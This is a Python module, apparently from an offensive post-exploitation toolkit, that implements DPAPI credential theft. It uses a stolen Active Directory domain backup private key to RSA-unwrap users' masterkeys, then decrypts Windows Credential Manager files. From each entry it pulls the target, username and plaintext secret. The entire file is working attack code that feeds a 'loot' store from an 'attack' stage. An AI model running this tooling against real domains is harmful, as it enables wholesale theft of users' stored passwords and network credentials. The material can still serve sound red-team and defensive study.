"""DPAPI crypto shared by the dpapi_* modules (stage 1-3).

Stage 1 (dpapi_backupkey) pulls the domain backup key pair; stages 2-3
spend it here. Third-party imports (impacket, Cryptodome) are
FUNCTION-LOCAL so core stays importable on a bare stdlib interpreter —
the modules gate their own run() on requirements before calling in.

The domain-backup-key path (MS-DPAP; the same one dploot and impacket's
dpapi.py example take):

  1. MasterKeyFile parse: MasterKeyLen, BackupKeyLen, CredHistLen,
     DomainKeyLen — the DomainKey blob holds the masterkey itself,
     RSA-wrapped with the backup key's public half
  2. RSA PKCS1-v1_5 decrypt DomainKey.SecretData (CAPI stores the
     ciphertext LITTLE-endian — reverse first) -> a
     DPAPI_DOMAIN_RSA_MASTER_KEY struct; buffer[:cbMasterKey] IS the
     64-byte masterkey. No PBKDF2/HMAC step on this path — that belongs
     to the user-password MasterKey blob only
  3. DPAPI_BLOB.decrypt(masterkey) opens anything that masterkey
     protects (impacket does the SHA1 + both session-key HMAC variants
     internally and self-verifies the signature)
"""

MASTERKEY_LEN = 64
MASTERKEY_HEX_LEN = 128  # 64 bytes, hexed


def is_guid_name(name):
    """Masterkey/credential files are named by their guid. The same
    dirs also hold BK-<domain> (cached backup-key blob), Preferred,
    desktop.ini and profile litter — only guid-named files are ours."""
    parts = name.split("-")
    if len(parts) != 5:
        return False
    return all(len(p) == n and
               all(c in "0123456789abcdefABCDEF" for c in p)
               for p, n in zip(parts, (8, 4, 4, 4, 12)))


def parse_backup_key_pem(loot_content):
    """RSA key object out of a dpapi-backupkey loot blob (cert + key)."""
    from Cryptodome.PublicKey import RSA
    start = loot_content.index("-----BEGIN RSA PRIVATE KEY-----")
    return RSA.import_key(loot_content[start:].encode())


def find_backup_key(store, label=""):
    """(rsa_key, None) from the newest dpapi-backupkey loot (or the
    newest whose label contains `label`), else (None, reason) with a
    user-presentable reason. Core stays UI-free; the modules print."""
    if store is None:
        return None, ("no evidence store — need a dpapi-backupkey loot "
                      "(run dpapi_backupkey first)")
    loot = store.loot("dpapi-backupkey")
    if label:
        loot = [l for l in loot if label in l["label"]]
    if not loot:
        return None, ("no dpapi-backupkey loot — run "
                      "auxiliary/attack/dpapi_backupkey first")
    try:
        return parse_backup_key_pem(loot[-1]["content"]), None
    except Exception as e:
        return None, f"backup key loot didn't parse - {e}"


def unwrap_domain_key(domain_key_blob, backup_key):
    """64-byte masterkey straight out of a DomainKey blob: RSA
    PKCS1-v1_5 decrypt of SecretData with the domain backup private
    key. None when the key doesn't fit (padding or structure check)."""
    from Cryptodome.Cipher import PKCS1_v1_5
    from impacket import dpapi
    dk = dpapi.DomainKey(domain_key_blob)
    sentinel = object()
    plain = PKCS1_v1_5.new(backup_key).decrypt(
        bytes(dk["SecretData"])[::-1], sentinel)
    if plain is sentinel:
        return None
    try:
        dmk = dpapi.DPAPI_DOMAIN_RSA_MASTER_KEY(plain)
    except Exception:
        return None  # wrong key: garbage that slipped past the padding
    if dmk["cbMasterKey"] != MASTERKEY_LEN or \
            len(dmk["buffer"]) < MASTERKEY_LEN:
        return None
    return bytes(dmk["buffer"][:MASTERKEY_LEN])


def decrypt_masterkey_file(data, backup_key):
    """(guid, masterkey) out of a MasterKeyFile blob:
      (guid, key)   — domain masterkey recovered
      (guid, None)  — DomainKey blob present but the backup key
                      didn't fit (wrong key, or the DC re-keyed)
      (None, None)  — no DomainKey blob at all: a LOCAL account's
                      masterkey, out of the domain-key path's reach"""
    from impacket import dpapi
    mkf = dpapi.MasterKeyFile(data)
    if mkf["DomainKeyLen"] <= 0:
        return None, None
    offset = len(mkf)  # blobs start after the 128-byte header
    # layout: MasterKey, BackupKey, CredHist, DomainKey
    dk_start = offset + mkf["MasterKeyLen"] + mkf["BackupKeyLen"] + \
        mkf["CredHistLen"]
    dk_blob = data[dk_start:dk_start + mkf["DomainKeyLen"]]
    masterkey = unwrap_domain_key(dk_blob, backup_key)
    guid = mkf["Guid"].decode("utf-16-le").rstrip("\x00")
    return guid, masterkey


def decrypt_credential_file(data, masterkeys):
    """(blob_guid, CREDENTIAL_BLOB) out of a CredentialFile blob, given
    a {guid: masterkey} map (guids lowercase, no braces — the masterkey
    FILE name is the guid). (guid, None) when no map key fits."""
    from impacket import dpapi
    from impacket.uuid import bin_to_string
    cred = dpapi.CredentialFile(data)
    blob = dpapi.DPAPI_BLOB(cred["Data"])
    guid = bin_to_string(blob["GuidMasterKey"]).lower()
    key = masterkeys.get(guid)
    if key is None:
        return guid, None
    try:
        plain = blob.decrypt(key)
    except ValueError:
        return guid, None  # wrong key: ciphertext garbage fails unpad
    if plain is None:
        return guid, None
    return guid, dpapi.CREDENTIAL_BLOB(plain)


def credential_fields(blob):
    """(target, username, secret) out of a CREDENTIAL_BLOB — text
    fields are UTF-16-LE; the secret (impacket's Unknown3) is UTF-16-LE
    for cmdkey/domain creds but can be raw bytes for generic ones, in
    which case it comes back hexed."""
    def u16(raw):
        return bytes(raw).decode("utf-16-le", "replace").rstrip("\x00")

    target = u16(blob["Target"])
    username = u16(blob["Username"])
    raw_secret = bytes(blob["Unknown3"])
    try:
        secret = raw_secret.decode("utf-16-le").rstrip("\x00")
    except UnicodeDecodeError:
        secret = raw_secret.hex()  # not really text — show the bytes
    return target, username, secret
